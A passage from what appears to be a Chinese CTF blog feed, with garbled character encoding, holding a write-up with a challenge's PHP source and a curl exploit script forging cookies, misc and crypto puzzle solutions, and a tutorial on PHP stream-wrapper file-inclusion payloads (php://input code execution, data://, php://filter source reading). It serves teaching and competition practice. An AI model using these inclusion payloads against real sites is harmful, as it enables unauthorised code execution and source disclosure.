<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fake</span><br><span class="line"></span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))</span><br><span class="line">        return true;</span><br><span class="line">    else</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;decrypt&#39;])) &#123;</span><br><span class="line">    $decr &#x3D; $_GET[&#39;decrypt&#39;];</span><br><span class="line">    if (Check())&#123;</span><br><span class="line">        $data &#x3D; $_SESSION[&#39;secret&#39;];</span><br><span class="line">        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;</span><br><span class="line">        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);</span><br><span class="line">        if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#39;çˆ¬&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length &#x3D; mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function aesEn ($key) &#123;</span><br><span class="line">	$method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">	$iv &#x3D; md5(&#39;174.0.222.75&#39;, true);</span><br><span class="line">	return base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;65a5817a-c324-407c-af18-b7c448bc09b4.node3.buuoj.cn&#x2F;admin.php?decrypt&#x3D;&quot;;</span><br><span class="line">$cookes &#x3D; &quot;y1ng&#x3D;8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address&#x3D;76d9f00467e5ee6abc3ca60892ef304e&quot;;</span><br><span class="line">$curl &#x3D; curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($curl, CURLOPT_COOKIE, $cookes);</span><br><span class="line">$cipher &#x3D; aesEn(&#39;y1ng&#39;);</span><br><span class="line">$url &#x3D; $url . urlencode($cipher);</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">$result &#x3D; curl_exec($curl);</span><br><span class="line">var_dump($result);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;åŠ å¯†æ–¹å¼çŸ¥é“,æ‰€ä»¥è®¿é—®ä¸€ä¸‹admin.phpå¾—åˆ°ä½ è®¿é—®çš„ip</span><br><span class="line">&#x2F;&#x2F;ä¸ç©¿PHPsessionid,sessionå°±ä¸ºç©º,æ‰€ä»¥åŠ å¯†çš„dataç­‰äºnull,åªè¦åŠ å¯†keyå°±è¡Œ</span><br></pre></td></tr></table></figure>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="æœ€ç®€å•MISC"><a href="#æœ€ç®€å•MISC" class="headerlink" title="æœ€ç®€å•MISC"></a>æœ€ç®€å•MISC</h3><p>7zæ‰“å¼€,è§£å‹å¾—åˆ°æ–‡ä»¶sercet</p>
<p>winhexæŸ¥çœ‹,ç¼ºå°‘PNGçš„æ–‡ä»¶å¤´,è¡¥ä¸Šæ–‡ä»¶å¤´å†ä¿®æ”¹åç¼€ä¸ºpngæ‰“å¼€å¾—åˆ°flag</p>
<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>winhexæ‰“å¼€,å›¾ç‰‡é«˜æ”¹é«˜å¾—åˆ°flag</p>
<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>binwalkåˆ†æå›¾ç‰‡</p>
<p>åˆ†ç†å‡ºå‹ç¼©åŒ…,å‹ç¼©åŒ…å†…æ˜¯è§†é¢‘,æ‰“å¼€è§†é¢‘,ä¸­é—´æœ‰ä¸€ä¸²å¾ˆå¿«çš„å›¾ç‰‡</p>
<p>ç”¨windowsè‡ªå¸¦çš„ç…§ç‰‡è§†é¢‘æ‰“å¼€,ç‚¹ç¼–è¾‘,ä¸€å¸§å¸§çš„çœ‹,æœ‰äºŒç»´ç çš„é¡µé¢æ‰«ç å¾—åˆ°ä¸‹é¢æ–‡å­—</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">424A447B79316E677A756973687561697D</span><br></pre></td></tr></table></figure>
<p>hexè½¬ASCII,è°ƒæ•´ä¸€ä¸‹é¡ºåºç»„æˆä¸€å¥è¯,å¾—åˆ°flag</p>
<h3 id="å°å§å§"><a href="#å°å§å§" class="headerlink" title="å°å§å§"></a>å°å§å§</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings xiaojiejie.jpeg|grep BJD</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ç­¾åˆ°-y1ng"><a href="#ç­¾åˆ°-y1ng" class="headerlink" title="ç­¾åˆ°-y1ng"></a>ç­¾åˆ°-y1ng</h3><p>base64è§£ç å¾—åˆ°flag</p>
<h3 id="è€æ–‡ç›²"><a href="#è€æ–‡ç›²" class="headerlink" title="è€æ–‡ç›²"></a>è€æ–‡ç›²</h3><p>ç”¨ç™¾åº¦ç¿»è¯‘æœ—è¯»</p>
<p>BJD{è¿™å°±æ˜¯flag},ä¸­é—´æ˜¯åŸæ±‰å­—</p>
<h3 id="ç‡•è¨€ç‡•è¯­"><a href="#ç‡•è¨€ç‡•è¯­" class="headerlink" title="ç‡•è¨€ç‡•è¯­"></a>ç‡•è¨€ç‡•è¯­</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br></pre></td></tr></table></figure>
<p>hexè½¬ASCII</p>
<p>å¾—åˆ°ï¼š<code>yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125;</code></p>
<p>å¦‚æœæ˜¯rot13,åç§»é‡åº”è¯¥ç›¸åŒ,ä½†æ˜¯è¿™é‡Œä¸åŒ,æ‰€ä»¥æ˜¯ç»´å‰å°¼äºšå¯†ç </p>
<p>yanzi æ˜¯ keyï¼Œè§£å¯†ä¸€ä¸‹å¾—åˆ° flag</p>
<h3 id="çµèƒ½ç²¾é€š"><a href="#çµèƒ½ç²¾é€š" class="headerlink" title="çµèƒ½ç²¾é€š"></a>çµèƒ½ç²¾é€š</h3><p>ä¸‹è½½å¾—åˆ°jpg,æ”¹åç¼€ä¸ºjpg,æ‰“å¼€å‘ç°æ˜¯ä¸€äº›ç¬¦å·,æœç´¢ä¸€ä¸‹å¾—çŸ¥æ˜¯åœ£å ‚æ­¦å£«å¯†ç ,æ˜¯çŒªåœˆå¯†ç çš„å˜å½¢</p>
<p>å¯¹åº”è§£å¯†å¾—åˆ°<br><code>IMKNIGHTSTEMPLAR</code><br>åŒ…ä¸Šflag<br><code>flag&#123;IMKNIGHTSTEMPLAR&#125;</code></p>
<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>çŒ«è½¬äºŒè¿›åˆ¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01000010</span><br><span class="line">01001010</span><br><span class="line">01000100</span><br><span class="line">01111011</span><br><span class="line">01001101</span><br><span class="line">00100001</span><br><span class="line">01100001</span><br><span class="line">00110000</span><br><span class="line">01111110</span><br><span class="line">01111101</span><br><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä¼ªåè®®</title>
    <url>/2020/03/16/CTF/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h1><h2 id="0x00-ä½•ä¸ºä¼ªåè®®"><a href="#0x00-ä½•ä¸ºä¼ªåè®®" class="headerlink" title="0x00 ä½•ä¸ºä¼ªåè®®"></a>0x00 ä½•ä¸ºä¼ªåè®®</h2><p>PHPå®˜ç½‘çš„è§£é‡Š:</p>
<p>PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼ <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>ã€ <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>ã€ <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> å’Œ <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚</p>
<a id="more"></a>

<p><strong>æ”¯æŒçš„åè®®:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F; â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http:&#x2F;&#x2F; â€” è®¿é—® HTTP(s) ç½‘å€</span><br><span class="line">ftp:&#x2F;&#x2F; â€” è®¿é—® FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; â€” è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰</span><br><span class="line">zlib:&#x2F;&#x2F; â€” å‹ç¼©æµ</span><br><span class="line">data:&#x2F;&#x2F; â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span><br><span class="line">glob:&#x2F;&#x2F; â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">phar:&#x2F;&#x2F; â€” PHP å½’æ¡£</span><br><span class="line">ssh2:&#x2F;&#x2F; â€” Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; â€” RAR</span><br><span class="line">ogg:&#x2F;&#x2F; â€” éŸ³é¢‘æµ</span><br><span class="line">expect:&#x2F;&#x2F; â€” å¤„ç†äº¤äº’å¼çš„æµ</span><br></pre></td></tr></table></figure>
<h2 id="0x01-ç”¨æ³•"><a href="#0x01-ç”¨æ³•" class="headerlink" title="0x01 ç”¨æ³•"></a>0x01 ç”¨æ³•</h2><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><blockquote>
<p>PHP.iniï¼š<br>file:// åè®®åœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›<br>allow_url_fopen ï¼šoff/on<br>allow_url_includeï¼šoff/on</p>
</blockquote>
<p><strong>file:// ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶</strong></p>
<p><strong>ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;file.php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    include $_GET[&#39;file&#39;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;ä½¿ç”¨file:&#x2F;&#x2F; [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]æ¥è®¿é—®æ–‡ä»¶</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;&#x2F;html&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><blockquote>
<p><strong>php://filteråœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›</strong><br><strong>php://inputã€ php://stdinã€ php://memory å’Œ php://temp éœ€è¦å¼€å¯allow_url_includeã€‚</strong></p>
</blockquote>
<p><strong>php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</strong></p>
<p><strong>åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://input</strong></p>
<ul>
<li><strong>php://filterç”¨äºè¯»å–æºç </strong></li>
<li><strong>php://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</strong></li>
</ul>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p><code>php://filter</code> æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file() å’Œ file_get_contents()ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;   è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</span><br><span class="line">read&#x3D;&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;       è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line">write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;      è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line">&lt;;ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;         ä»»ä½•æ²¡æœ‰ä»¥ read&#x3D; æˆ– write&#x3D; ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line">&#x2F;&#x2F;å¯ä»¥ä»¥base64ç¼–ç çš„æ–¹å¼è¯»å–index.phpçš„å†…å®¹</span><br></pre></td></tr></table></figure>
<h5 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h5><h6 id="å­—ç¬¦ä¸²è¿‡æ»¤å™¨"><a href="#å­—ç¬¦ä¸²è¿‡æ»¤å™¨" class="headerlink" title="å­—ç¬¦ä¸²è¿‡æ»¤å™¨"></a>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.rot13		ç­‰åŒäºç”¨ str_rot13()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</span><br><span class="line">string.toupper		ç­‰åŒäºç”¨ strtoupper()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</span><br><span class="line">string.tolower		ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</span><br><span class="line">string.strip_tags	ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</span><br></pre></td></tr></table></figure>
<h6 id="è½¬æ¢è¿‡æ»¤å™¨"><a href="#è½¬æ¢è¿‡æ»¤å™¨" class="headerlink" title="è½¬æ¢è¿‡æ»¤å™¨"></a>è½¬æ¢è¿‡æ»¤å™¨</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">convert.base64-encode	ç­‰åŒäºbase64_encode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</span><br><span class="line">convert.base64-decode	ç­‰åŒäºbase64_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</span><br><span class="line">convert.quoted-printable-encode æ²¡æœ‰å¯¹åº”å‡½æ•°</span><br><span class="line">convert.quoted-printable-decode	ç­‰åŒäºç”¨ quoted_printable_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</span><br></pre></td></tr></table></figure>
<h6 id="å‹ç¼©è¿‡æ»¤å™¨"><a href="#å‹ç¼©è¿‡æ»¤å™¨" class="headerlink" title="å‹ç¼©è¿‡æ»¤å™¨"></a>å‹ç¼©è¿‡æ»¤å™¨</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zlib.deflate å‹ç¼©</span><br><span class="line">zlib.inflate è§£å‹</span><br></pre></td></tr></table></figure>
<h6 id="åŠ å¯†è¿‡æ»¤å™¨"><a href="#åŠ å¯†è¿‡æ»¤å™¨" class="headerlink" title="åŠ å¯†è¿‡æ»¤å™¨"></a>åŠ å¯†è¿‡æ»¤å™¨</h6><p>mcrypt</p>
<p>mdecrypt</p>
<p>ç”¨çš„ä¸å¤š,ä¸è¯´äº†</p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p><strong>php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,å¯ä»¥è¯»å–åˆ°postæ²¡æœ‰è§£æçš„åŸå§‹æ•°æ®, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å› ä¸ºå®ƒä¸ä¾èµ–äºç‰¹å®šçš„ php.ini æŒ‡ä»¤ã€‚</strong></p>
<p><strong>æ³¨ï¼šenctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚</strong></p>
<blockquote>
<p>allow_url_fopen ï¼šoff/on<br>allow_url_includeï¼šon</p>
</blockquote>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">&#x2F;&#x2F;postdata</span><br><span class="line">a&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>å®ä¾‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); &#x2F;&#x2F;class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">è§£æ³•ä¸º  url&#x2F;index.php?user&#x3D;php:&#x2F;&#x2F;input  </span><br><span class="line">[POSTDATA] the user is admin</span><br><span class="line">æœ€åè¾“å‡ºä¸ºhello admin!å¹¶ä¸”åŒ…å«å¯¹åº”æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>æ˜¯ä¸€ä¸ªåªå†™çš„æ•°æ®æµï¼Œ å…è®¸ä½ ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼ å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#file.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$code&#x3D;$_GET[&quot;page&quot;];  </span><br><span class="line">file_put_contents($code,&quot;test&quot;);   </span><br><span class="line">?&gt;</span><br><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;output</span><br><span class="line">&#x2F;&#x2F;ç»“æœè¾“å‡ºtest</span><br></pre></td></tr></table></figure>
<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>data:èµ„æºç±»å‹;ç¼–ç ,å†…å®¹<br>æ•°æ®æµå°è£…å™¨<br>å½“allow_url_include æ‰“å¼€çš„æ—¶å€™ï¼Œä»»æ„æ–‡ä»¶åŒ…å«å°±ä¼šæˆä¸ºä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<blockquote>
<p>PHP.iniï¼š<br>data://åè®®å¿…é¡»åŒåœ¨onæ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼›<br>allow_url_fopen ï¼šon<br>allow_url_includeï¼šon<br>php ç‰ˆæœ¬å¤§äºç­‰äº php5.2</p>
</blockquote>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$filename&#x3D;$_GET[&quot;a&quot;];  </span><br><span class="line">include(&quot;$filename&quot;);  </span><br><span class="line">?&gt;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip://, bzip2://, zlib://"></a>zip://, bzip2://, zlib://</h3><blockquote>
<p>PHP.iniï¼š<br>zip://, bzip2://, zlib://åè®®åœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›<br>allow_url_fopen ï¼šoff/on<br>allow_url_includeï¼šoff/on</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3ä¸ªå°è£…åè®®ï¼Œéƒ½æ˜¯ç›´æ¥æ‰“å¼€å‹ç¼©æ–‡ä»¶ã€‚</span><br><span class="line">compress.zlib:&#x2F;&#x2F;file.gz - å¤„ç†çš„æ˜¯ &#39;.gz&#39; åç¼€çš„å‹ç¼©åŒ…</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;file.bz2 - å¤„ç†çš„æ˜¯ &#39;.bz2&#39; åç¼€çš„å‹ç¼©åŒ…</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt - å¤„ç†çš„æ˜¯ &#39;.zip&#39; åç¼€çš„å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼šzip://, bzip2://, zlib:// å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åã€‚</strong></p>
<h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>php ç‰ˆæœ¬å¤§äºç­‰äº php5.3.0</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line"></span><br><span class="line">zip:&#x2F;&#x2F; [å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]**</span><br><span class="line">è¦ç”¨ç»å¯¹è·¯å¾„+urlç¼–ç #</span><br></pre></td></tr></table></figure>
<h4 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2://"></a>bzip2://</h4><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">compress.bzip2:&#x2F;&#x2F;file.bz2</span><br><span class="line">ç›¸å¯¹è·¯å¾„ä¹Ÿå¯ä»¥</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨7-zipç”Ÿæˆä¸€ä¸ªbz2å‹ç¼©æ–‡ä»¶ã€‚</span><br><span class="line">pyload:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.bz2</span><br><span class="line">æˆ–è€…æ–‡ä»¶æ”¹ä¸ºjpgåç¼€</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.jpg</span><br></pre></td></tr></table></figure>
<h4 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h4><p>åŒç†</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN 2019 åˆèµ›]Love Math</title>
    <url>/2020/03/16/CTF_WP/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math/</url>
    <content><![CDATA[<h1 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h1><a id="more"></a>

